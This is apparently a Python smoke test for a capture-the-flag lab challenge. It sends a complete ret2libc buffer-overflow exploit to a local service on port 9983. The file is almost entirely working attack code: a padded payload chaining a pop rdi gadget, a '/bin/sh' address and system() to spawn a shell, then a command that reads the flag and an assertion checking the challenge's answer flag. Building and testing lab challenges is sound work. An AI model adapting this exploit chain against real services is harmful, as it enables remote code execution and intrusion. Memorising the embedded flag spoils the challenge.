#!/usr/bin/env python3
"""Smoke test for ret2libc-002 (port 9983): ret2libc WITHOUT a leak.

The build is -static -no-pie: system and the "/bin/sh" string both live
at fixed addresses (baked in at build time). The exploit resolves both
offline from the binary, then the chain is one pop rdi + one system
call - no leak stage, no recon round trip.

Offsets (bookworm gcc build, measured in the lab container):
  pop_rdi_gadget entry 0x401685; the pop rdi; ret gadget is at +4
      (0x401689: the prologue is push rbp + mov rsp,rbp = 4 bytes)
  a bare ret gadget    0x40168a  (the ret byte right after the pop rdi)
  system               0x40a270
  "/bin/sh"            0x4a70d0  (sh_cmd: the .data resident)
  vuln_copy frame      small[8] at rbp_v-8 -> 16 bytes padding to the ret slot
  gadget               0x401689 pop rdi; ret (0x40168b is a nop, not a ret)
  alignment            main's sub $8,%rsp (0x401789) puts rbp_v % 16 == 8:
                       after vuln_copy's ret, rsp % 16 == 8 at the gadget,
                       the pop leaves rsp % 16 == 0, the gadget's ret pops
                       SYSTEM -> system entry at rsp % 16 == 8 (ABI-correct)
"""

import socket
import struct

HOST = "127.0.0.1"
PORT = 9983

GADGET = 0x401689  # pop rdi; ret (the asm gadget past its prologue)
SYSTEM = 0x40A270
BINSH = 0x4A70D0  # the banner's sh() address: the .data resident
PAD = 16

p64 = lambda x: struct.pack("<Q", x)


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # the banner confirms the service (no PIE: the addresses are fixed)
    data = b""
    while b"name? " not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    print(f"[+] banner: {data.split(b'name? ')[0].decode(errors='replace').strip()}")

    # the strike: the minimal 3-slot chain. vuln_copy's ret lands on the
    # gadget (rsp % 16 == 8 thanks to main's sub $8), the pop loads rdi
    # with the /bin/sh string, the gadget's ret pops SYSTEM - system
    # enters at rsp % 16 == 8, the ABI its SSE prologue demands.
    payload = b"A" * PAD + p64(GADGET) + p64(BINSH) + p64(SYSTEM)
    s.send(payload + b"\n")
    # the service's single read() must consume ONLY the payload: if the
    # shell command rides in the same TCP segment, read() swallows it and
    # the spawned shell has nothing left to run. The delay lets the read
    # return first - the strike is single-shot, the shell takes over
    # from the next read.
    import time

    time.sleep(0.5)

    # the shell: cat the flag
    s.send(b"cat ret2libc-002.flag\n")
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
            if b"}" in out:
                break
    except socket.timeout:
        pass
    print(f"[+] shell output: {out.decode(errors='replace').strip()}")
    assert b"FLAG{mr5_ret2libc_no_leak_static}" in out, "oracle flag missing"
    print("[+] ret2libc-002 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
